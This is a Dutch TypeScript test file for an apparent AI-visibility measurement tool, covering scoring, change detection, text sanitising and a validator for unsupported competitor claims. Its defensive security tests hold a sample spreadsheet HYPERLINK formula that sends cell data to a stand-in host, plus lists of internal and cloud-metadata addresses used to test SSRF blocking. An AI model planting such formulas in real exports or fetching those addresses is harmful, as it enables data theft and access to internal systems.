  ok("kleine letters en spaties", resolveTargets([rec([" v1 "])], missed)[0].targets.length === 1);
  ok("runId meegenomen", resolveTargets([rec(["V1"])], missed)[0].targets[0].runId === "r1");
});

group("oude rapporten blijven leesbaar", () => {
  ok("niet-array → leeg", readRecommendations(null).length === 0);
  ok("zonder targets → lege lijst", readRecommendations([{ title: "X" }])[0].targets.length === 0);
  ok("ontbrekend type → article", readRecommendations([{ title: "X" }])[0].type === "article");
});

group("GEO-score", () => {
  const all = (v: boolean): GeoCriteria => ({
    answersTargetQuestionUpFront: v, hasStandaloneCitableSentences: v,
    namesTheBusinessExplicitly: v, usesConcreteFacts: v, answersFollowUpQuestions: v,
  });
  ok("alles goed = 100", geoScore(all(true)) === 100);
  ok("niets goed = 0", geoScore(all(false)) === 0);
  ok("drie van vijf = 60", geoScore({ ...all(false), answersTargetQuestionUpFront: true, usesConcreteFacts: true, answersFollowUpQuestions: true }) === 60);
  ok("geen issues bij alles goed", geoIssues(all(true)).length === 0);
  ok("elk gemist criterium wordt een verbeterpunt", geoIssues(all(false)).length === 5);
  ok("issue is leesbaar", geoIssues({ ...all(true), namesTheBusinessExplicitly: false })[0].includes("noemt het bedrijf expliciet"));
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nGemeten effect (optimalisatie.md 5.4/5.5)");

group("vergelijken", () => {
  const m = (o: Record<string, boolean>) => new Map(Object.entries(o));
  const c = compare(m({ a: false, b: false, c: true }), m({ a: true, b: false, c: true }));
  ok("alleen gedeelde vragen", c.total === 3 && c.beforeMentioned === 1 && c.afterMentioned === 2);
  // Een vraag die één kant niet beoordeeld is, is een dataprobleem. Geen daling.
  ok("vraag zonder 'voor' telt niet", compare(m({ a: false }), m({ a: true, z: true })).total === 1);
  ok("vraag zonder 'na' telt niet", compare(m({ a: false, b: true }), m({ a: true })).total === 1);
});

group("oordeel", () => {
  ok("+100 bij 4 vragen", deltaOf({ total: 4, beforeMentioned: 0, afterMentioned: 4 }) === 100);
  ok("daling is negatief", deltaOf({ total: 4, beforeMentioned: 3, afterMentioned: 1 }) === -50);
  ok("weinig vragen = hoge drempel", thresholdOf({ total: 3, beforeMentioned: 1, afterMentioned: 2 }) > thresholdOf({ total: 20, beforeMentioned: 7, afterMentioned: 13 }));
  ok("1 vraag = te weinig data", verdictOf({ total: 1, beforeMentioned: 0, afterMentioned: 1 }) === "te_weinig_data");
  // Met drie vragen is de band zo breed dat +33 punten nog steeds ruis is.
  ok("kleine stijging bij 3 vragen = gelijk", verdictOf({ total: 3, beforeMentioned: 1, afterMentioned: 2 }) === "gelijk");
  ok("0→alles bij 10 vragen = gestegen", verdictOf({ total: 10, beforeMentioned: 0, afterMentioned: 10 }) === "gestegen");
  ok("alles→0 = gedaald", verdictOf({ total: 10, beforeMentioned: 10, afterMentioned: 0 }) === "gedaald");
  ok("+1 op 20 is ruis", verdictOf({ total: 20, beforeMentioned: 5, afterMentioned: 6 }) === "gelijk");
});

// doorloop-huyberts.md punt 6: "gelijk" is statistisch correct en voor de klant
// onbruikbaar zonder te zeggen hoeveel vragen er nodig zouden zijn. Echte
// productiecijfers van Huyberts Keukens, ná de fix van punt 1 (die 5 in plaats
// van 2 gemeten doelvragen opleverde voor de Eindhoven-pagina).
group("minQuestionsForSignal: hoeveel vragen zijn er nodig, echte cijfers", () => {
  const eindhoven = { total: 5, beforeMentioned: 0, afterMentioned: 1 }; // 0 -> 1 van de 5, 20%
  ok("de Eindhoven-pagina zelf is 'gelijk'", verdictOf(eindhoven) === "gelijk");
  eq2("en heeft er minstens 25 vragen voor nodig", minQuestionsForSignal(eindhoven), 25);

  // Het oorspronkelijke voorbeeld uit doorloop-huyberts.md, vóór de fix van
  // punt 1: 2 doelvragen, 0 -> 1, een stijging van 50 punten.
  const oudVoorbeeld = { total: 2, beforeMentioned: 0, afterMentioned: 1 };
  ok(
    "bij minder vragen is het gevraagde aantal ook lager (grotere waargenomen sprong)",
    (minQuestionsForSignal(oudVoorbeeld) ?? Infinity) < (minQuestionsForSignal(eindhoven) ?? Infinity),
  );

  eq2("geen gemeten verschil: geen enkel aantal vragen helpt", minQuestionsForSignal({
    total: 8,
    beforeMentioned: 3,
    afterMentioned: 3,
  }), null);

  eq2("nul vragen: onbekend, geen gooi", minQuestionsForSignal({ total: 0, beforeMentioned: 0, afterMentioned: 0 }), null);

  // Een grote, echte sprong bij een redelijk aantal vragen hoeft geen extra
  // vragen: het antwoord is dan het HUIDIGE aantal, niet een hoger getal.
  const duidelijkeStijging = { total: 20, beforeMentioned: 0, afterMentioned: 20 };
  ok(
    "wat al significant is (0 naar 20 van de 20), krijgt geen 'meer nodig'-getal",
    verdictOf(duidelijkeStijging) === "gestegen",
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nPeriodieke verandering (optimalisatie.md 6.2/6.7)");

const noChange: PeriodChange = {
  previousWeek: 1, scoreDelta: 0, scoreMeaningful: false, scoreThreshold: 25,
  won: [], lost: [], competitorsUp: [], competitorsDown: [], newCompetitors: [],
};

group("het veranderingsblok", () => {
  ok("eerste meting", buildChangeBlock(null, 0).includes("EERSTE meting"));
  const ruis = buildChangeBlock({ ...noChange, scoreDelta: 4 }, 2);
  // Het model moet expliciet te horen krijgen dat het hier niets uit mag
  // concluderen, anders schrijft het over een stijging die er niet is.
  ok("ruis wordt 'stabiel'", ruis.includes("BINNEN de meetruis") && ruis.includes("GEEN conclusies"));
  ok("echte stijging", buildChangeBlock({ ...noChange, scoreDelta: 30, scoreMeaningful: true }, 2).includes("ECHTE verandering"));
  ok("gewonnen vragen", buildChangeBlock({ ...noChange, won: ["x?"] }, 2).includes("NIEUW GEWONNEN"));
  ok("verloren vragen", buildChangeBlock({ ...noChange, lost: ["x?"] }, 2).includes("VERLOREN"));
  ok("niets omgeslagen wordt gemeld", buildChangeBlock(noChange, 2).includes("niets omgeslagen"));
  ok("oprukkende concurrent", buildChangeBlock({ ...noChange, competitorsUp: [{ name: "C", delta: 3 }] }, 2).includes("C (+3)"));
});

group("wanneer wél mailen", () => {
  ok("eerste keer altijd", isWorthEmailing(null));
  // Een mail die elke periode hetzelfde zegt, wordt na drie keer niet geopend,
  // en dan mist de klant ook de mail die er wél toe doet.
  ok("niets veranderd → geen mail", !isWorthEmailing(noChange));
  ok("echte scoreverandering → mail", isWorthEmailing({ ...noChange, scoreMeaningful: true }));
  ok("gewonnen vraag → mail", isWorthEmailing({ ...noChange, won: ["x"] }));
  ok("nieuwe concurrent → mail", isWorthEmailing({ ...noChange, newCompetitors: ["x"] }));
  ok("concurrent +1 is te weinig", !isWorthEmailing({ ...noChange, competitorsUp: [{ name: "x", delta: 1 }] }));
  ok("concurrent +2 is genoeg", isWorthEmailing({ ...noChange, competitorsUp: [{ name: "x", delta: 2 }] }));
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDomeinen en webadressen (optimalisatie.md 7.1 / 0.12)");

group("domein uit url", () => {
  ok("www eraf", domainOf("https://www.trustpilot.com/x") === "trustpilot.com");
  // Zonder dit tellen nl.trustpilot.com en trustpilot.com als twee bronnen.
  ok("subdomein samengevoegd", domainOf("https://nl.trustpilot.com/x") === "trustpilot.com");
  ok("diep subdomein", domainOf("https://a.b.example.nl/x") === "example.nl");
  ok("co.uk blijft heel", domainOf("https://shop.example.co.uk/x") === "example.co.uk");
  ok("poort genegeerd", domainOf("https://example.nl:8443/x") === "example.nl");
  ok("ongeldige url → null", domainOf("dit is geen url") === null);
});

group("tekst opslaanbaar maken voor Postgres", () => {
  // Twee van de 22 gecrawlde pagina's van swapfiets.nl bevatten een NUL-byte.
  // Postgres weigert daarop de HELE batch-insert, dus die twee kostten de
  // volledige content-inventaris. Zie lib/pg-text.ts.
  const nul = String.fromCharCode(0);
  const hoog = String.fromCharCode(0xd83d); // losse high surrogate
  const laag = String.fromCharCode(0xde00); // losse low surrogate

  ok("NUL-byte verdwijnt", sanitizeForPostgres(`a${nul}b`) === "ab");
  ok("meerdere NUL-bytes verdwijnen", sanitizeForPostgres(`${nul}a${nul}${nul}b${nul}`) === "ab");
  ok("losse high surrogate verdwijnt", sanitizeForPostgres(`a${hoog}b`) === "ab");
  ok("losse low surrogate verdwijnt", sanitizeForPostgres(`a${laag}b`) === "ab");

  // Wat WÉL opslaanbaar is, mag niet sneuvelen, een emoji is een geldig paar.
  ok("emoji blijft heel", sanitizeForPostgres("fiets 🚲 blauw") === "fiets 🚲 blauw");
  ok("accenten blijven heel", sanitizeForPostgres("België — €19,90") === "België — €19,90");
  ok("gewone tekst blijft gelijk", sanitizeForPostgres("Swapfiets") === "Swapfiets");
  ok("lege tekst blijft leeg", sanitizeForPostgres("") === "");
  ok("null blijft null", sanitizeForPostgres(null) === null);
  ok("undefined wordt null", sanitizeForPostgres(undefined) === null);

  // De /g-regex mag geen lastIndex meeslepen tussen aanroepen: dat was de
  // valkuil waardoor een gedeelde regex om de beurt treffers overslaat.
  ok("tweede aanroep werkt net zo goed", sanitizeForPostgres(`x${nul}y`) === "xy");
  ok("derde aanroep ook", sanitizeForPostgres(`x${nul}y`) === "xy");

  ok("detectie ziet de NUL", hasUnstorableChars(`a${nul}b`));
  ok("detectie ziet de losse surrogate", hasUnstorableChars(`a${hoog}b`));
  ok("detectie laat schone tekst met rust", !hasUnstorableChars("fiets 🚲 blauw"));
  ok("detectie op null is false", !hasUnstorableChars(null));
});

group("webadres controleren", () => {
  ok("gewoon adres", checkUrlFormat("voorbeeld.nl").ok);
  ok("met protocol", checkUrlFormat("https://voorbeeld.nl").ok);
  ok("leeg wordt geweigerd", !checkUrlFormat("").ok);
  ok("spaties worden geweigerd", !checkUrlFormat("voor beeld.nl").ok);
  ok("e-mailadres wordt geweigerd", !checkUrlFormat("jan@voorbeeld.nl").ok);
});

/**
 * ⚠️ Deze groep bewaakt de kritieke bevinding uit antihack.md (K1). Elk adres
 * hieronder kwam op 29 augustus 2026 door `checkUrlFormat` heen, en de pijplijn
 * haalde het vervolgens op en toonde de inhoud terug in het merkdossier.
 *
 * Gaat hier ooit een test rood, verwijder hem dan NIET: dan is de zeef stuk.
 */
group("CSV-cellen zijn veilig voor Excel (antihack.md M4)", () => {
  // Formule-injectie. De titel van een contentstuk komt uit het model, dat
  // schrijft op basis van tekst van een website die wij niet beheren. Een
  // geprepareerde site kan zo een formule in de export van de klant krijgen.
  ok("gelijkteken wordt onschadelijk", csvCell("=1+1") === "'=1+1");
  ok("plus wordt onschadelijk", csvCell("+1") === "'+1");
  ok("min wordt onschadelijk", csvCell("-1") === "'-1");
  ok("apenstaartje wordt onschadelijk", csvCell("@SUM(A1)") === "'@SUM(A1)");
  ok("tab wordt onschadelijk", csvCell("\tiets") === "'\tiets");
  ok(
    "een HYPERLINK die data wegstuurt wordt tekst",
    csvCell('=HYPERLINK("http://kwaad/?d="&A1,"klik")').includes("'="),
  );

  // Het aanhalen zelf moet blijven werken zoals het werkte.
  ok("gewone tekst blijft ongemoeid", csvCell("Fietsen in Utrecht") === "Fietsen in Utrecht");
  ok("puntkomma wordt aangehaald", csvCell("a;b") === '"a;b"');
  ok("aanhalingsteken wordt verdubbeld", csvCell('zeg "hoi"') === '"zeg ""hoi"""');
  ok("regeleinde wordt aangehaald", csvCell("regel1\nregel2") === '"regel1\nregel2"');
  ok("null wordt leeg", csvCell(null) === "");
  ok("een getal blijft een getal", csvCell(42) === "42");

  // ⚠️ Een negatief getal is een echte waarde, maar Excel ziet er een formule
  // in. Onschadelijk maken wint: een apostrof in een cel is een schoonheidsfout,
  // een uitgevoerde cel is een lek. Alle getalkolommen in de export zijn
  // tellingen en verschillen, en die zijn nooit negatief behalve een daling.
  ok("negatief getal krijgt de apostrof", csvCell(-3) === "'-3");
});

group("interne IP-adressen na het opzoeken (antihack.md K1, stap A1)", () => {
  const intern = [
    "169.254.169.254", "10.0.0.55", "127.0.0.1", "192.168.1.10",
    "172.16.0.1", "172.31.255.254", "100.64.0.1", "0.0.0.0",
    "198.18.0.1", "224.0.0.1", "192.0.0.1",
    "::1", "::", "fd00::1", "fc00::abcd", "fe80::1",
    // ⚠️ Een IPv4-adres vermomd als IPv6. Zonder het uitpakken hiervan glipt
    // elk privé adres er in deze vorm gewoon langs.
    "::ffff:10.0.0.1", "::ffff:127.0.0.1",
  ];
  for (const ip of intern) ok(`weert ${ip}`, isInternalIp(ip));

  const publiek = [
    "8.8.8.8", "1.1.1.1", "193.176.0.1", "172.32.0.1", "172.15.0.1",
    // ⚠️ Publieke IPv6 moet WEL door. isInternalHostname weigert elk
    // IPv6-adres, want niemand typt zijn website zo in. Hier mag dat niet:
    // een doodgewone website kan een AAAA-record hebben, en die weigeren zou
    // betekenen dat we hem niet meer kunnen crawlen.
    "2001:4860:4860::8888", "2a00:1450:4001:800::200e",
    "::ffff:8.8.8.8",
  ];
  for (const ip of publiek) ok(`laat ${ip} door`, !isInternalIp(ip));

  ok("rommel telt als intern", isInternalIp("niet-een-adres"));
  ok("leeg telt als intern", isInternalIp(""));
  ok("een deel boven 255 telt als intern", isInternalIp("999.1.1.1"));
});

group("interne adressen worden geweerd (antihack.md K1)", () => {
  const intern = [
    "169.254.169.254", // metadata-adres van de cloud
    "10.0.0.55",
    "10.0.0.5",
    "192.168.1.10",
    "172.17.0.12", // Docker
    "172.31.255.1",
    "100.64.0.10", // carrier grade NAT
    "127.0.0.1",
    "0.0.0.0",
    "198.18.0.1", // testnetwerk
    "224.0.0.1", // multicast
    "localhost",
    "db.internal",
    "kassa.local",
    "::1",
    "fd00::1",
  ];
  for (const host of intern) {
    ok(`weert ${host}`, isInternalHostname(host));
    ok(`formaatcontrole weert ${host}`, !checkUrlFormat(host).ok);
  }

  // ⚠️ De tegenproef telt net zo zwaar. Een zeef die alles weert is geen zeef,
  // en 172.32 en 172.15 vallen NET buiten het privé-bereik 172.16 tot 172.31.
  const publiek = [
    "outerorbit.nl",
    "mediamarkt.nl",
    "sub.domein.co.uk",
    "voorbeeld-met-streepje.nl",
    "8.8.8.8",
    "172.32.0.1",
    "172.15.0.1",
    "193.176.0.1",
  ];
  for (const host of publiek) {
    ok(`laat ${host} door`, !isInternalHostname(host));
  }

  // ⚠️ Dit adres komt hier bewust WEL doorheen, en dat is geen fout maar de
  // grens van een pure functie: het is een geldige publieke naam die pas bij het
  // opzoeken naar 127.0.0.1 blijkt te wijzen. Die vangt lib/safe-fetch.ts.
  ok("een publieke naam die naar binnen wijst komt hier langs", !isInternalHostname("127.0.0.1.nip.io"));
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nWanneer is een meetronde klaar (optimalisatie.md 1.5)");

group("openstaande periodieke metingen tellen", () => {
  const periodiek = (weekNo: number) => ({ payload_json: { promptId: "p", weekNo } });
  const impact = (weekNo: number) => ({
    payload_json: { promptId: "p", weekNo, impact: { purpose: "impact", contentPieceId: "c", wave: 1 } },
  });

  ok("niets open → 0", countOpenPeriodicMeasurements([], 0) === 0);
  ok("twee van dezelfde periode", countOpenPeriodicMeasurements([periodiek(0), periodiek(0)], 0) === 2);
  ok("andere periode telt niet mee", countOpenPeriodicMeasurements([periodiek(1)], 0) === 0);

  // De kern: een hermeting ná publicatie draagt óók weekNo 0 mee, maar hoort
  // niet bij de periodieke ronde. Telde die wel mee, dan bleef de aggregatie
  // van de nulmeting wachten op werk dat er niets mee te maken heeft.
  ok("impactmeting telt niet mee", countOpenPeriodicMeasurements([impact(0)], 0) === 0);
  ok("gemengd: alleen de periodieke", countOpenPeriodicMeasurements([periodiek(0), impact(0)], 0) === 1);

  // Een payload zonder periode is geen periodieke meting van periode 0. Anders
  // zou een kapotte rij de aggregatie eeuwig tegenhouden.
  ok("lege payload telt niet mee", countOpenPeriodicMeasurements([{ payload_json: null }], 0) === 0);
  ok("payload zonder weekNo", countOpenPeriodicMeasurements([{ payload_json: { promptId: "p" } }], 0) === 0);
});

// ════════════════════════════════════════════════════════════════════════════
group("Bewijsdossier (implementatieplan.md R1.1)", () => {
  const basis: EvidenceEntry = {
    code: "V1",
    runId: "run-1",
    promptText: "Waar boek ik een vergaderlocatie?",
    category: "Beslissing",
    weight: 0.5,
    cluster: "vergaderlocatie",
    intentType: "transactional",
    brandsInAnswer: [],
    answerExcerpt: "Bepaal eerst je wensen en eisen…",
  };

  // De kern van R1.1: een vraag zonder merken moet als HELE ZIN in de prompt
  // staan, niet als lege lijst. Een model dat "geen data" ziet vult dat gat op;
  // dat is precies hoe het rapport eerder concurrenten verzon.
  const leeg = formatEvidenceDossier([basis]);
  ok("merkloze vraag wordt expliciet benoemd", leeg.includes("GEEN ENKEL bedrijf bij naam genoemd"));
  ok("merkloze vraag verbiedt een concurrent te noemen", leeg.includes("Noem er ook geen"));
  ok("de harde regel staat in de kop", leeg.includes("HARDE REGEL"));
  ok("code en vraagtekst staan erin", leeg.includes("V1") && leeg.includes("Waar boek ik"));
  ok("gewicht en tags staan erin", leeg.includes("gewicht 0.50") && leeg.includes("transactional"));

  const metMerken = formatEvidenceDossier([
    {
      ...basis,
      brandsInAnswer: [
        { name: "Regus", role: "concurrent", position: 2, citedSources: ["https://regus.nl"] },
        { name: "Meetingselect", role: "vergelijker", position: 1, citedSources: [] },
      ],
    },
  ]);
  ok("merken worden opgesomd", metMerken.includes("Regus") && metMerken.includes("Meetingselect"));
  ok("rol gaat mee", metMerken.includes("concurrent") && metMerken.includes("vergelijker"));
  ok("positie gaat mee", metMerken.includes("positie 2"));
  ok("bron gaat mee", metMerken.includes("https://regus.nl"));
  ok("geen merkloos-zin bij gevulde lijst", !metMerken.includes("GEEN ENKEL bedrijf"));

  // Ontbrekende positie mag geen "positie null" opleveren in de prompt.
  const zonderPositie = formatEvidenceDossier([
    { ...basis, brandsInAnswer: [{ name: "X", role: "onbekend", position: null, citedSources: [] }] },
  ]);
  ok("onbekende positie leest netjes", zonderPositie.includes("positie onbekend"));

  ok("leeg dossier levert lege string", formatEvidenceDossier([]) === "");

  // Het fragment mag niet middenin een woord afbreken.
  const lang = `${"woord ".repeat(200)}einde`;
  const kort = excerpt(lang);
  ok("fragment wordt afgekapt", kort.length < lang.length && kort.endsWith("…"));
  ok("fragment breekt op een woordgrens", !kort.slice(0, -1).endsWith("woor"));
  ok("kort antwoord blijft heel", excerpt("Kort antwoord.") === "Kort antwoord.");
});

// ════════════════════════════════════════════════════════════════════════════
group("Claimvalidator (implementatieplan.md R1.3)", () => {
  const known = ["Regus", "Spaces", "Het Oude Raadhuis Hoofddorp", "Dotslash Utrecht", "Spacesworks"];

  // Het echte geval uit kwaliteitsanalyse-5-testcases.md §2.2: het rapport
  // noemde twee concurrenten bij een vraag waar geen enkel bedrijf in stond.
  const echt = stripUnsupportedClaims(
    "Deze vraag is zeer populair en koopgericht. Concurrenten zoals Het Oude Raadhuis Hoofddorp " +
      "en Dotslash Utrecht scoren hier wel, Van der Valk niet.",
    { knownNames: known, allowedNames: [], where: "aanbeveling: test" },
  );
  ok("niet-onderbouwde zin verdwijnt", !echt.text.includes("Het Oude Raadhuis"));
  ok("de onderbouwde zin blijft", echt.text.includes("zeer populair en koopgericht"));
  ok("verwijdering wordt vastgelegd", echt.stripped.length === 1);
  ok("de naam wordt gemeld", echt.stripped[0]?.unsupportedName === "Het Oude Raadhuis Hoofddorp");

  // Wél onderbouwd: dezelfde zin, maar nu stond die concurrent er echt in.
  const onderbouwd = stripUnsupportedClaims("Regus wordt hier genoemd, jij niet.", {
    knownNames: known,
    allowedNames: ["Regus"],
    where: "aanbeveling: test",
  });
  ok("onderbouwde naam blijft staan", onderbouwd.text.includes("Regus"));
  ok("niets gestript bij bewijs", onderbouwd.stripped.length === 0);

  // Twee namen in één zin, één onderbouwd: de zin gaat er in z'n geheel uit.
  // Dat kost een correcte mededeling, maar de zin bevat óók een onjuiste en die
  // twee zijn niet te scheiden zonder te herschrijven.
  const gemengd = stripUnsupportedClaims("Regus en Dotslash Utrecht winnen hier.", {
    knownNames: known,
    allowedNames: ["Regus"],
    where: "aanbeveling: test",
  });
  ok("gemengde zin gaat er helemaal uit", gemengd.text === "");
  ok("gemengde zin wordt gemeld", gemengd.stripped.length === 1);

  // Een punt binnen een naam is GEEN zinseinde. Gevonden bij de verificatie op
  // echte rapporttekst: de naïeve splitser hakte "Bol.com" in "Bol." + "com",
  // waardoor geen van beide helften de merknaam nog bevatte en de onjuiste
  // bewering ongemoeid bleef. Precies het geval dat gevangen moest worden.
  const domeinnaam = stripUnsupportedClaims(
    "Deze vraag helpt klanten bij hun keuze. Bol.com scoort hier, Coolblue niet.",
    { knownNames: ["Bol.com", "EP.nl"], allowedNames: [], where: "aanbeveling: test" },
  );
  ok("naam met punt wordt herkend", domeinnaam.stripped.length === 1);
  ok("naam met punt: juiste naam gemeld", domeinnaam.stripped[0]?.unsupportedName === "Bol.com");
  ok("naam met punt: rest blijft staan", domeinnaam.text.startsWith("Deze vraag helpt klanten"));
  ok("naam met punt: claim is weg", !domeinnaam.text.includes("Bol.com"));

  // Getallen met een decimale punt breken de zin evenmin op.
  const getal = stripUnsupportedClaims("De score is 3.5 punten. Regus wint hier.", {
    knownNames: ["Regus"],
    allowedNames: ["Regus"],
    where: "gap: test",
  });
  ok("decimaal getal breekt de zin niet", getal.text.includes("3.5 punten"));

  // Deelreeksen mogen niet matchen: "Spaces" zit letterlijk in "Spacesworks".
  const deelreeks = stripUnsupportedClaims("Spacesworks wordt genoemd.", {
    knownNames: known,
    allowedNames: ["Spacesworks"],
    where: "gap: test",
  });
  ok("deelreeks levert geen valse treffer", deelreeks.stripped.length === 0);

  // Tekst zonder enige merknaam blijft ongemoeid.
  const schoon = stripUnsupportedClaims("Hier noemt de AI geen enkele aanbieder.", {
    knownNames: known,
    allowedNames: [],
    where: "gap: test",
  });
  ok("tekst zonder namen blijft heel", schoon.text === "Hier noemt de AI geen enkele aanbieder.");
  ok("geen namen, niets gestript", schoon.stripped.length === 0);

  // Loopt een veld helemaal leeg, dan komt er een eerlijke zin voor in de plaats
  // in plaats van een leeg vak op het rapportscherm.
  const leeggelopen = validateField("Dotslash Utrecht wint hier.", {
    knownNames: known,
    allowedNames: [],
    where: "aanbeveling: test",
  });
  ok("leeggelopen veld krijgt terugval", leeggelopen.text === NEUTRAL_FALLBACK);

  // Zonder merkenregister (nieuw profiel) mag de validator niets kapotmaken.
  const geenRegister = stripUnsupportedClaims("Van alles en nog wat.", {
    knownNames: [],
    allowedNames: [],
    where: "gap: test",
  });
  ok("leeg register laat de tekst ongemoeid", geenRegister.text === "Van alles en nog wat.");
});

// ════════════════════════════════════════════════════════════════════════════
group("Positie van een vermelding (implementatieplan.md R3.2)", () => {
  // De aanleiding: `position` zat al in het schema maar de prompt legde nooit
  // uit hoe er geteld moest worden. Van de 521 vermeldingen in de eerste vijf
  // analyses stonden er 215 op 0 en 2 op -1, naast gewone waarden 1 t/m 10.
  // Uit dat mengsel is niet te herleiden wat "0" betekende, dus wordt het null.
  ok("0 is onbruikbaar", normalizePosition(0) === null);
  ok("negatief is onbruikbaar", normalizePosition(-1) === null);
  ok("null blijft null", normalizePosition(null) === null);
  ok("1 is geldig", normalizePosition(1) === 1);
  ok("10 is geldig", normalizePosition(10) === 10);
  ok("kommagetal wordt afgerond", normalizePosition(2.4) === 2);
  ok("NaN is onbruikbaar", normalizePosition(Number.NaN) === null);

  // Het gemiddelde slaat onbruikbare waarden over in plaats van ze als 0 mee te
  // tellen. Anders trekt één ontspoorde meting het cijfer omlaag.
  ok("gemiddelde over geldige waarden", averagePosition([1, 3]) === 2);
  ok("onbruikbare waarden tellen niet mee", averagePosition([0, 2, 4]) === 3);
  ok("alles onbruikbaar → null", averagePosition([0, -1, null]) === null);
  ok("leeg → null", averagePosition([]) === null);
  ok("afgerond op één decimaal", averagePosition([1, 2, 2]) === 1.7);

  // Gewogen variant (R6.1): een drie keer gemeten vraag mag niet drie plekken
  // van het gemiddelde bepalen.
  ok(
    "gewicht 1 gedraagt zich als het ongewogen gemiddelde",
    weightedAveragePosition([
      { position: 1, weight: 1 },
      { position: 3, weight: 1 },
    ]) === 2,
  );
  ok(
    "een drie keer gemeten vraag telt als één vraag",
    // Vraag A drie keer op positie 4 (elk 1/3), vraag B één keer op 1.
    // Per vraag: (4 + 1) / 2 = 2,5. Per meting zou het 3,25 zijn geweest.
    weightedAveragePosition([
      { position: 4, weight: 1 / 3 },
      { position: 4, weight: 1 / 3 },
      { position: 4, weight: 1 / 3 },
      { position: 1, weight: 1 },
    ]) === 2.5,
  );
  ok(
    "onbruikbare positie telt niet mee, ook niet met gewicht",
    weightedAveragePosition([
      { position: 0, weight: 5 },
      { position: 2, weight: 1 },
    ]) === 2,
  );
  ok("gewicht 0 telt niet mee", weightedAveragePosition([{ position: 3, weight: 0 }]) === null);
});

// ════════════════════════════════════════════════════════════════════════════
group("Per vraag tellen in plaats van per meting (implementatieplan.md R6.1)", () => {
  // De aanleiding staat in migratie 0031: dezelfde analyse leverde in twee
  // opeenvolgende periodes 17 vs 11 meetbare vragen en score 18 vs 36 op, zonder
  // dat er iets veranderd was. De zwaarste vragen worden daarom meerdere keren
  // gemeten, maar dan moeten ze niet ook zwaarder gaan MEEtellen.
  const shares = shareByRun([
    { runId: "a1", promptId: "A" },
    { runId: "a2", promptId: "A" },
    { runId: "a3", promptId: "A" },
    { runId: "b1", promptId: "B" },
  ]);
  ok("drie metingen van dezelfde vraag wegen elk 1/3", shares.get("a1") === 1 / 3);
  ok("een eenmalig gemeten vraag weegt 1", shares.get("b1") === 1);
  ok("de aandelen tellen op tot het aantal VRAGEN", sumShare(["a1", "a2", "a3", "b1"], shares) === 2);

  // Twee van de drie metingen van vraag A leverden een vermelding op: 2/3 vraag.
  ok("deelresultaat telt fractioneel mee", Math.abs(sumShare(["a1", "a2"], shares) - 2 / 3) < 1e-9);

  // Faalt de beoordeling van één herhaling, dan wegen de overgebleven twee elk
  // 1/2, de vraag blijft in totaal 1 wegen in plaats van te verdampen.
  const naUitval = shareByRun([
    { runId: "a1", promptId: "A" },
    { runId: "a2", promptId: "A" },
  ]);
  ok("uitval verandert de deler, niet het totaal", sumShare(["a1", "a2"], naUitval) === 1);

  // Zonder herhalingen komt er exact hetzelfde uit als vóór R6.1, bewust, zodat
  // historische scores vergelijkbaar blijven met de nieuwe.
  const zonderHerhaling = shareByRun([
    { runId: "x", promptId: "X" },
    { runId: "y", promptId: "Y" },
  ]);
  ok("zonder herhalingen weegt alles 1", sumShare(["x", "y"], zonderHerhaling) === 2);

  // Een meting waarvan de vraag verwijderd is staat op zichzelf; twee van die
  // metingen mogen niet als herhalingen van elkaar gaan gelden.
  const zonderVraag = shareByRun([
    { runId: "p", promptId: null },
    { runId: "q", promptId: null },
  ]);
  ok("verweesde metingen wegen elk 1", sumShare(["p", "q"], zonderVraag) === 2);

  // De kolommen in de database zijn hele vragen; "2,67 vragen" zegt een klant niets.
  ok("afronden op hele vragen", roundQuestions(2.67) === 3);
  ok("nul blijft nul", roundQuestions(0) === 0);
  // Maar nooit naar 0: "0 keer geciteerd" is een ander bericht dan "zelden".
  ok("iets is nooit nul", roundQuestions(1 / 3) === 1);
});

// ════════════════════════════════════════════════════════════════════════════
group("Feitenkaart (contentbriefing.md §9 / R5.1)", () => {
  const facts = numberFacts([
    { text: "All-in vanaf €419 per maand", source: "site /acties", allowed: true, citable: true },
    { text: "Pechhulp: NEE", source: "klant, bevestigd 29-07", allowed: false, citable: true },
    {
      text: "Sitetekst: bij ons staat de klant centraal en werken we met een persoonlijke aanpak",
      source: "site /over-ons",
      allowed: true,
      citable: false,
    },
  ]);

  ok("nummering begint bij F1", facts[0].ref === "F1" && facts[1].ref === "F2");
  // Achtergrond krijgt met opzet GEEN nummer, een nummer is de uitnodiging om
  // ernaar te verwijzen, en dat was precies het alibi van 31 juli.
  ok("achtergrond krijgt geen F-nummer", facts[2].ref === "");

  const kaart = formatFactCard(facts);
  ok("bruikbaar feit staat op de kaart", kaart.includes("F1") && kaart.includes("€419"));
  // Verboden staan in een EIGEN blok. Tussen de feiten leest een model ze als
  // materiaal; onder een verbodskop leest het ze als grens. Dat verschil is
  // precies waar het in de Udenhout-run misging.
  ok("verbod staat onder een eigen kop", kaart.includes("MAG JE NIET BEWEREN"));
  ok("verbod krijgt geen F-nummer op de kaartregel", !/F2\s+Pechhulp/.test(kaart));

  // Zonder feiten mag er niets concreets beweerd worden. Dat moet er expliciet
  // staan, want een leeg blok leest een model als "verzin het zelf maar".
  ok("achtergrond staat in een eigen blok", kaart.includes("ACHTERGROND: GEEN BRON"));

  const leeg = formatFactCard([]);
  ok("lege kaart verbiedt expliciet", leeg.includes("GEEN ENKELE concrete bewering"));

  // Het model mag zichzelf niet vrijpleiten: dekking wordt in code bepaald.
  ok("geldig F-nummer dekt", isSupported("F1", facts));
  ok("kleine letters mogen ook", isSupported("f1", facts));
  ok("onbekend F-nummer dekt niet", !isSupported("F9", facts));
  ok("null dekt niet", !isSupported(null, facts));
  // Een verwijzing naar een VERBOD onderbouwt niets; het weerlegt juist.
  ok("verbod dekt niet", !isSupported("F2", facts));
  ok("achtergrond dekt niet", !isSupported("", facts));

  // ── De citaatplicht (verificatie 31 juli) ────────────────────────────────
  // Bestaan van het F-nummer was niet genoeg: 6 van de 7 beweringen wezen naar
  // hetzelfde blok sitetekst, dus gold alles als onderbouwd en werd er geen
  // enkele vraag gesteld. Nu moet de aangewezen zin er ook echt in staan.
  ok("citaat dat er staat, dekt", isSupported("F1", facts, "vanaf €419 per maand"));
  ok("hoofdletters en leestekens mogen afwijken", isSupported("F1", facts, "VANAF 419  PER MAAND"));
  ok("citaat dat er niet staat, dekt niet", isSupported("F1", facts, "pechhulp inbegrepen") === false);
  ok("leeg citaat dekt niet", !isSupported("F1", facts, ""));
